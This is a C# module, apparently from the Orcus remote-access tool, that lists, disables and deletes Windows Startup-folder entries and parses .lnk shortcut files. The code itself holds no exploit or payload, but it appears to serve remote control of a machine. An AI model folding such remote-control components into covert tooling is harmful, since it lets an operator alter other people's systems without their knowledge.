using System;
using System.Collections.Generic;
using System.IO;
using Orcus.Shared.Commands.StartupManager;

namespace Orcus.Commands.StartupManager
{
    public static class FolderAutostart
    {
        public static List<AutostartProgramInfo> GetAutostartProgramsFromFolder(AutostartLocation autostartLocation, bool isEnabled)
        {
            var result = new List<AutostartProgramInfo>();
            try
            {
                var directory = GetDirectoryFromAutostartLocation(autostartLocation, isEnabled);
                if (directory.Exists)
                {
                    foreach (var fileInfo in directory.GetFiles())
                    {
                        if (fileInfo.Name == "desktop.ini")
                            continue;

                        FileInfo file;
                        if (fileInfo.Extension == ".lnk")
                        {
                            file = new FileInfo(GetShortcutTarget(fileInfo.FullName));
                        }
                        else
                        {
                            file = fileInfo;
                        }

                        var entry = new AutostartProgramInfo
                        {
                            Name = fileInfo.Name, //This should be fileinfo
                            CommandLine = file.FullName,
                            IsEnabled = isEnabled,
                            AutostartLocation = autostartLocation
                        };

                        result.Add(AutostartManager.CompleteAutostartProgramInfo(entry));
                    }
                }
            }
            catch (Exception)
            {
                // ignored
            }

            return result;
        }

        public static void ChangeAutostartEntry(AutostartLocation autostartLocation, string name, bool isEnabled)
        {
            if (!isEnabled)
                CreateDisabledFolder(autostartLocation);

            var file =
                new FileInfo(Path.Combine(GetDirectoryFromAutostartLocation(autostartLocation, !isEnabled).FullName,
                    name));

            file.MoveTo(Path.Combine(GetDirectoryFromAutostartLocation(autostartLocation, isEnabled).FullName,
                name));

            if (isEnabled)
            {
                var directory = GetDirectoryFromAutostartLocation(autostartLocation, false); //get folder for disabled entries
                if (directory.GetFileSystemInfos().Length == 0) //if empty
                    directory.Delete(false); //remove
            }
        }

        public static void RemoveAutostartEntry(AutostartLocation autostartLocation, string name, bool isEnabled)
        {
            var file =
                new FileInfo(Path.Combine(GetDirectoryFromAutostartLocation(autostartLocation, isEnabled).FullName,
                    name));

            file.Delete();

            if (!isEnabled)
            {
                var directory = GetDirectoryFromAutostartLocation(autostartLocation, false); //get folder for disabled entries
                if (directory.GetFileSystemInfos().Length == 0) //if empty
                    directory.Delete(false); //remove
            }
        }

        private static void CreateDisabledFolder(AutostartLocation autostartLocation)
        {
            var directory = GetDirectoryFromAutostartLocation(autostartLocation, false);
            if (!directory.Exists)
                directory.Create();
        }

        private static DirectoryInfo GetDirectoryFromAutostartLocation(AutostartLocation autostartLocation,
            bool isEnabled)
        {
            var directory = GetDirectoryFromAutostartLocation(autostartLocation);
            if(!isEnabled)
                directory = new DirectoryInfo(Path.Combine(directory.FullName, "AutorunsDisabled"));

            return directory;
        }

        private static DirectoryInfo GetDirectoryFromAutostartLocation(AutostartLocation autostartLocation)
        {
            switch (autostartLocation)
            {
                case AutostartLocation.ProgramData:
                    return
                        new DirectoryInfo(Path.Combine(
                            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                            @"..\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"));
                case AutostartLocation.AppData:
                    return new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                default:
                    throw new ArgumentOutOfRangeException(nameof(autostartLocation), autostartLocation, null);
            }
        }

        private static string GetShortcutTarget(string file)
        {
            try
            {
                if (System.IO.Path.GetExtension(file).ToLower() != ".lnk")
                {
                    throw new Exception("Supplied file must be a .LNK file");
                }

                FileStream fileStream = File.Open(file, FileMode.Open, FileAccess.Read);
                using (System.IO.BinaryReader fileReader = new BinaryReader(fileStream))
                {
                    fileStream.Seek(0x14, SeekOrigin.Begin);     // Seek to flags
                    uint flags = fileReader.ReadUInt32();        // Read flags
                    if ((flags & 1) == 1)
                    {                      // Bit 1 set means we have to
                                           // skip the shell item ID list
                        fileStream.Seek(0x4c, SeekOrigin.Begin); // Seek to the end of the header
                        uint offset = fileReader.ReadUInt16();   // Read the length of the Shell item ID list
                        fileStream.Seek(offset, SeekOrigin.Current); // Seek past it (to the file locator info)
                    }

                    long fileInfoStartsAt = fileStream.Position; // Store the offset where the file info
                                                                 // structure begins
                    uint totalStructLength = fileReader.ReadUInt32(); // read the length of the whole struct
                    fileStream.Seek(0xc, SeekOrigin.Current); // seek to offset to base pathname
                    uint fileOffset = fileReader.ReadUInt32(); // read offset to base pathname
                                                               // the offset is from the beginning of the file info struct (fileInfoStartsAt)
                    fileStream.Seek((fileInfoStartsAt + fileOffset), SeekOrigin.Begin); // Seek to beginning of
                                                                                        // base pathname (target)
                    long pathLength = (totalStructLength + fileInfoStartsAt) - fileStream.Position - 2; // read
                                                                                                        // the base pathname. I don't need the 2 terminating nulls.
                    char[] linkTarget = fileReader.ReadChars((int)pathLength); // should be unicode safe
                    var link = new string(linkTarget);

                    int begin = link.IndexOf("\0\0");
                    if (begin > -1)
                    {
                        int end = link.IndexOf("\\\\", begin + 2) + 2;
                        end = link.IndexOf('\0', end) + 1;

                        string firstPart = link.Substring(0, begin);
                        string secondPart = link.Substring(end);

                        return firstPart + secondPart;
                    }
                    else
                    {
                        return link;
                    }
                }
            }
            catch
            {
                return "";
            }
        }
    }
}